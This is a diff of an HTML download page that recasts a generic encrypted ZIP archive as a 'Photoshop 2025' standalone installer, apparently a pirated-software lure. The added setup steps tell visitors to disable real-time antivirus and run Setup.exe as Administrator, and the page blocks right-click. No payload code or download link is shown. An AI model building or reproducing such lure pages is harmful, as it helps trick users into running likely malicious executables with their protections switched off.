@@ -23,6 +23,9 @@
     .vignette {
       background: radial-gradient(circle, transparent 60%, rgba(8, 8, 12, 0.9) 100%);
     }
+    details summary::-webkit-details-marker {
+      display: none;
+    }
   </style>
 </head>
 <body class="bg-grid min-h-screen relative overflow-x-hidden flex flex-col justify-between" oncontextmenu="return false;">
@@ -68,9 +71,9 @@
       </div>
 
       <!-- Download Card Grid -->
-      <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
         
-        <!-- Google Drive .ZIP Download Card -->
+        <!-- Photoshop 2025 Download Card -->
         <div class="bg-slate-900/40 border border-slate-800 hover:border-cyan-500/50 rounded-sm p-6 flex flex-col justify-between transition-all duration-300 group hover:shadow-[0_0_20px_rgba(6,182,212,0.12)] relative overflow-hidden">
           
           <!-- Subtle Top Right Glow Overlay -->
@@ -83,16 +86,50 @@
                 <span class="w-1.5 h-1.5 rounded-full bg-cyan-400 animate-pulse"></span>
                 ZIP_ARCHIVE
               </span>
-              <span class="mono text-[10px] text-slate-500">v1.0</span>
+              <span class="mono text-[10px] text-slate-500">v2025.0</span>
             </div>
 
-            <!-- Asset Title & Details -->
-            <h3 class="mono font-semibold text-base text-slate-200 group-hover:text-cyan-300 transition-colors mb-2">
-              // SYSTEM_ASSET_PACK.ZIP
+            <!-- Asset Title & Description -->
+            <h3 class="mono font-semibold text-lg text-slate-200 group-hover:text-cyan-300 transition-colors mb-2">
+              // PHOTOSHOP 2025
             </h3>
-            <p class="text-xs text-slate-400 leading-relaxed mb-6">
-              Encrypted high-resolution asset archive hosted on Google Drive. Extract using WinRAR, 7-Zip, or standard OS utilities.
+            <p class="text-xs text-slate-400 leading-relaxed mb-4">
+              Standalone installation package for Photoshop 2025. Includes base installer assets, configuration presets, and performance optimization profiles.
             </p>
+
+            <!-- Collapsible Setup Instructions Menu -->
+            <details class="group/dropdown mb-6 border border-slate-800/80 bg-slate-950/60 rounded-sm transition-all">
+              <summary class="mono text-xs text-slate-300 hover:text-cyan-400 p-3 flex items-center justify-between cursor-pointer select-none">
+                <span class="flex items-center gap-2">
+                  <span class="text-cyan-400 font-bold">//</span>
+                  <span>SETUP_INSTRUCTIONS</span>
+                </span>
+                <span class="text-slate-500 group-open/dropdown:rotate-180 transition-transform duration-200">▼</span>
+              </summary>
+              
+              <div class="p-4 pt-2 border-t border-slate-800/60 space-y-2.5 mono text-[11px] text-slate-400">
+                <div class="flex items-start gap-2">
+                  <span class="text-cyan-400 font-semibold">01.</span>
+                  <span>Click <strong class="text-slate-200">DOWNLOAD PHOTOSHOP 2025</strong> below to retrieve the archive.</span>
+                </div>
+                <div class="flex items-start gap-2">
+                  <span class="text-cyan-400 font-semibold">02.</span>
+                  <span>Extract the downloaded <code class="text-slate-200 bg-slate-900 px-1 py-0.5 rounded border border-slate-800">.ZIP</code> file to your local directory using 7-Zip or WinRAR.</span>
+                </div>
+                <div class="flex items-start gap-2">
+                  <span class="text-cyan-400 font-semibold">03.</span>
+                  <span>Temporarily disable real-time antivirus shields to prevent installation blockages.</span>
+                </div>
+                <div class="flex items-start gap-2">
+                  <span class="text-cyan-400 font-semibold">04.</span>
+                  <span>Right-click <code class="text-slate-200 bg-slate-900 px-1 py-0.5 rounded border border-slate-800">Setup.exe</code> inside the extracted folder and choose <strong class="text-slate-200">Run as Administrator</strong>.</span>
+                </div>
+                <div class="flex items-start gap-2">
+                  <span class="text-cyan-400 font-semibold">05.</span>
+                  <span>Follow the on-screen installer wizard prompts and restart your system upon completion.</span>
+                </div>
+              </div>
+            </details>
           </div>
 
           <!-- Direct Download Action -->
@@ -104,7 +141,7 @@
               <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path>
               </svg>
-              <span>INITIATE_DOWNLOAD (.ZIP)</span>
+              <span>DOWNLOAD PHOTOSHOP 2025 (.ZIP)</span>
             </a>
           </div>
 
